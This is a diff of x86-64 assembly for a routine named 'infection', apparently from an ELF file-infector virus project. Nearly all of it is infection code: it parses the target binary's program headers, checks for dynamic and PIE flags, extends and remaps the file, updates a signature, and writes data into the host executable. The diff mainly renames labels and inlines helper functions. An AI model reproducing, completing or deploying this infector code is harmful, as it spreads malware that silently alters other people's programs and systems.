@@ -1,4 +1,3 @@
-infection:
 	PUSH_ALLr
 
 	mov		rax, [rbp + 16]
@@ -31,7 +30,7 @@ infection:
 	xor r8, r8
 	mov r13, 1
 
-.loop:
+.loopinfection:
 	push r11
 	push rcx
 
@@ -45,11 +44,11 @@ infection:
 	pop r11
 	inc r8
 	cmp dword [rbx], 3
-	jne	.no_interp
-.no_interp:
+	jne	.no_interpinfection
+.no_interpinfection:
 
 	cmp dword [rbx], 2
-	jne	.no_dynamic
+	jne	.no_dynamicinfection
 	; FAUT PARSER CETTE MERDE DE HEADER DYNAMIC AAAAH\
 	; RBX c'est l'offset
 	PUSH_ALL
@@ -60,16 +59,16 @@ infection:
 	shr		rcx, 4
 	mov		rdi, r14
 	add		rdi, [rbx + phdr.p_offset]
-	.parsing_dyn:
+	.parsing_dyninfection:
 
 
 	mov		eax, [rdi]
 	cmp		eax, 0x6ffffffb
-	jne		.next_dyn
+	jne		.next_dyninfection
 
 	mov		eax, [rdi + 8]
 	test	eax, 134217728
-	je		.next_dyn
+	je		.next_dyninfection
 
 	push	rax
 	mov		rax, [rbp + 16]
@@ -77,19 +76,19 @@ infection:
 	mov		BYTE [rax], 1
 	pop		rax
 
-.next_dyn:
+.next_dyninfection:
 	add		rdi, 16
-	loop	.parsing_dyn
+	loop	.parsing_dyninfection
 
 
 
 	POP_ALL
 
-.no_dynamic:
+.no_dynamicinfection:
 
 
 	cmp dword [rbx], 1
-	jne .no_load
+	jne .no_loadinfection
 
 	mov rax, [rbx + phdr.p_filesz]
 	add rax, [rbx + phdr.p_offset]
@@ -98,10 +97,10 @@ infection:
 	add		rdx, mydata.p_offset
 
 	cmp rax, [rdx]
-	jb .no_above
+	jb .no_aboveinfection
 	mov [rdx], rax
 
-.no_above_offset:
+.no_above_offsetinfection:
 
 	mov		rdx, [rbp + 16]
 	add		rdx, mydata.p_vaddr
@@ -110,25 +109,25 @@ infection:
 	add rax, [rbx + phdr.p_memsz]
 
 	cmp rax, [rdx]
-	jb .no_above
+	jb .no_aboveinfection
 	mov [rdx], rax
 
-.no_above:
+.no_aboveinfection:
 	cmp dword [rbx + phdr.p_flags], 6
-	jnle .no_load
+	jnle .no_loadinfection
 	mov r15, [rbx + phdr.p_vaddr]
 	sub r15, [rbx + phdr.p_offset]
 
-.no_load:
+.no_loadinfection:
 	cmp dword [rbx], 0
-	je .useless_ph
+	je .useless_phinfection
 	cmp dword [rbx], 4
-	je .useless_ph
+	je .useless_phinfection
 	cmp dword [rbx], 5
-	je .useless_ph
-	jmp .not_useless_ph
+	je .useless_phinfection
+	jmp .not_useless_phinfection
 
-.useless_ph:
+.useless_phinfection:
 	mov rax, r8
 	dec rax
 	mul rdi
@@ -136,23 +135,23 @@ infection:
 	mov r11, rax
 	xor r13, r13
 
-.not_useless_ph:
+.not_useless_phinfection:
 	dec rcx
-	jnz .loop
+	jnz .loopinfection
 
 
 	mov		rbx, [rbp + 16]
 	add		rbx, mydata.dynm
 	cmp BYTE [rbx], 0
-	je	.no_check_dynm
+	je	.no_check_dynminfection
 	mov		rbx, [rbp + 16]
 	add		rbx, mydata.ispie
 	cmp BYTE [rbx], 0
-	je	.return
+	je	.returninfection
 
-.no_check_dynm:
+.no_check_dynminfection:
 	cmp r13, 1
-	je	.return
+	je	.returninfection
 
 	mov		rax, [rbp + 16]
 	add		rax, mydata.p_vaddr
@@ -160,7 +159,8 @@ infection:
 	mov		rdx, [rbp + 16]
 	add		rdx, mydata.p_offset
 	mov rdx, [rdx]
-	call align_value
+%include "functions/align_value.s"
+	;call align_value
 
 	mov		rsi, [rbp + 16]
 	add		rsi, mydata.p_vaddr
@@ -199,7 +199,7 @@ infection:
 	mov		rsi, [rbp + 16]
 	add		rsi, mydata.p_offset
 	cmp rax, [rsi]
-	jbe .no_extend
+	jbe .no_extendinfection
 
 	mov rax, SYS_munmap
 	mov rdi, r14
@@ -231,12 +231,13 @@ infection:
 	syscall
 	mov r14, rax
 
-.no_extend:
+.no_extendinfection:
 	push rdi
 	push rsi
 	push rcx
 
-	call update_signature
+	%include "functions/updata_signature.s"
+	;call update_signature
 
 	mov rax, SYS_mmap
 	xor rdi, rdi
@@ -248,7 +249,7 @@ infection:
 	syscall
 
 	cmp rax, -4095
-	jae .return
+	jae .returninfection
 	mov rbx, rax
 
 	mov rdi, rbx
@@ -307,7 +308,7 @@ infection:
 	mov rsi, [rsi]
 	syscall
 
-.return:
+.returninfection:
 
 	mov		rax, [rbp + 16]
 	add		rax, mydata.entry
@@ -331,4 +332,3 @@ infection:
 
 	mov rax, r13
 	POP_ALLr
-	ret
